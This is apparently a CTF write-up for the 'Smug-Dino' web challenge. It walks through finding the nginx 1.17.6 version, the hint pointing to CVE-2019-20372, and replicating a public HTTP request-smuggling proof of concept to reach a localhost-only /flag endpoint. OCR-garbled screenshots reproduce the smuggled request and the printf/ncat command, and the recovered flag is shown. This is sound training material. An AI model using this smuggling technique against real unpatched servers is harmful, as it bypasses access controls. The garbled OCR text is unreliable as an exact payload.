# Smug-Dino
> Don't you know it's wrong to smuggle dinosaurs... and other things?

## About the Challenge
We were given a website, and this website have 2 endpoints, `/` and `/hint`. This is what the `/hint` endpoint looks like


[Image extracted text: Tell us some recon about the server and we'Il give you a hint :)
Server name:
Server Version:
Submit]


Because we know about the web server information (You can find this information on HTTP response header)


[Image extracted text: Pretty
Pat
Hex
HTTP/1-1 200
Server:
nginx/ 1
17-€]


Input `nginx` and `1.17.6` and voilà we got the hint


[Image extracted text: HINT:
We
believe
the
item you
seek is
only
accessible
localhost
clients
the
server;
All
other requests
[flag
Will
processed
401
It
seems
the
server
is
issuing
302
redirections
handle
401
erors
Is it possible
use
redirection somehow
the
localhost flag?
HINT:
CVE
2019-
the
get]


Hmmm, `CVE-2019-***` means this is a CVE related to Nginx considering that the Nginx used in this website is outdated

## How to Solve?
At first, i tried to find any CVEs related to nginx (You can also check the list [here](https://www.cvedetails.com/vulnerability-list/vendor_id-315/product_id-101578/F5-Nginx.html))


[Image extracted text: FS > Nginx
Security Vulnerabilities
Published in:   2023
January
February
March
April
May
June
July
August
September
CVSS Scores Greater Than:
In CISA KEV Catalog
Sort Results By
Publish Date I}
Update Date !}
CVE Number 0}
CVE Number t}
CVSS Score I}
EPSS Score I}
39 vulnerabilities found
Copy
CVE-2022-41742
Max Base Score
7.1
NGINX Open Source before versions 1.23.2 and 1.22.1, NGINX Open Source Subscription before versions R2 P1 and
Published
2022-10-19
RI PI, and NGINX Plus before versions R27 P1 and R26 P1 have a vulnerability in the module ngx_http_mp4_module
Updated
2023-02-10
that might allow a local attacker to cause a worker process crash;
or might result in worker process memory
disclosure by using a specially crafted audio or video file. The issue affects only NGINX products that are built with
EPSS
0.04%
the module
nax
httn
mn4
module
when
the mn4 directive is Ised in the confiauratinn file
Further
the Attack is
CVE-2022-41741
Max Base Score
7.8
NGINX Open Source before versions 1.23.2 and 1.22.1, NGINX Open Source Subscription before versions R2 P1 and
Published
2022-10-19
R1 P1, and NGINX Plus before versions R2Z P1I and R26 P1 have a vulnerability in the module ngx_http_mp4_module
Updated
2023-03-24
that might allow a local attacker to corrupt NGINX worker memory, resulting in its termination or potential other
impact using a specially crafted audio or video file: The issue affects only NGINX products that are built with the
EPSS
0.04%
nax httn
mn4
module
when the mn4 directive is used in the confiauration file. Further: the attack is nossible onlv]


And I found this `CVE-2019-20372` and luckily we also found the proof of concept


[Image extracted text: This can then easily be tested by
running
Docker container:
docker
run
~it
80 :80
Idefault
conf: /etc/nginx/conf.d/default.conf
nginx:l.17.6
Example Vulnerable Request
The request that is made to the server looks as follows:
GET
HTTP / 1.1
Host: localhost
Content
Length:
GET
hidden/ index-html
HTTP/1.1
Host:
notlocalhost
This can be easily crafted
printf On the command line with ncat creating Our connection to the remote
server:
printf
GET
HTTP/1-1rinHost:
localhost irinContent-Length:
56irinlri nGET
hidden/ index
htnl
HTTP /1-1IrinHost
notlocalhostirinirin
ncat
localhost
no
against .
Pwd
using]


And then i replicate the proof of concept in the website and finally we got the flag


[Image extracted text: Request
Response
Pretty
Raw
Hex
Pretty
Raw
Hex
Render
GET
[flag
cxc
HTTP/1.1
HTTP/1. 1
200
Host
localhost
3009
Server
nginx/1-17.6
Content-
Lengch:
Dat =
Fri
2023
16 : 30: 50
GHT
Content
Type
text /plain
GET
flag HTTP/1.1
Content
Lengch:
Host :
ueb
csau
10: 3009
Connect
on-
reep-alive
csavct f
dOnt
smuggl 3
Flaes_!}
Sep]


```
csawctf{d0nt_smuggl3_Fla6s_!}
```